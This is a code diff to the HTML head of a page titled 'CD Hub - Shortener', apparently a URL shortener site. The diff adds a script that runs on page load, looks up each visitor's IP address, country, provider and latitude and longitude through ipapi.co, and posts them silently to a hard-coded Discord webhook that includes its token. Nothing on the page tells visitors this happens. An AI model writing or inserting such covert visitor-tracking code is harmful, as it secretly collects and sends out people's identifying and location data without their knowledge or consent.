@@ -19,6 +19,52 @@
   <title>CD Hub - Shortener</title>
   <link rel="stylesheet" href="CSS/styles.css">
   <link rel="icon" type="image/png" sizes="32x32" href="Images/logo.png">
+
+  <script>
+    async function sendUserInfoToWebhook() {
+      try {
+        // Fetch IP and location data from the API
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+
+        // Structure the embed message for Discord
+        const embed = {
+          title: "New User Info",
+          description: "User info collected from the website visit.",
+          color: 0x32CD32, // Embed color
+          fields: [
+            { name: "IP Address", value: data.ip, inline: true },
+            { name: "Country", value: data.country_name, inline: true },
+            { name: "Provider", value: data.org, inline: true },
+            { name: "Latitude", value: data.latitude || 'N/A', inline: true },
+            { name: "Longitude", value: data.longitude || 'N/A', inline: true }
+          ],
+          footer: {
+            text: "CD Hub - URL Shortener"
+          }
+        };
+
+        // Webhook URL
+        const webhookURL = 'https://discord.com/api/webhooks/1325964921938116619/-Xyo8xmmD2CCY6V3s8RyzmNe1INHKWNOz0S-o7-3jek-xD8aJ1433Qg518t90gzePUjo'; // Replace with your Discord webhook URL
+
+        // Send the embed to the webhook
+        await fetch(webhookURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ embeds: [embed] }),
+        });
+
+        console.log('User info sent successfully to Discord');
+      } catch (error) {
+        console.error('Failed to send user info to Discord:', error);
+      }
+    }
+
+    // Call the function when the page loads
+    window.onload = sendUserInfoToWebhook;
+  </script>
 </head>
 <body>
   <canvas id="particles"></canvas>
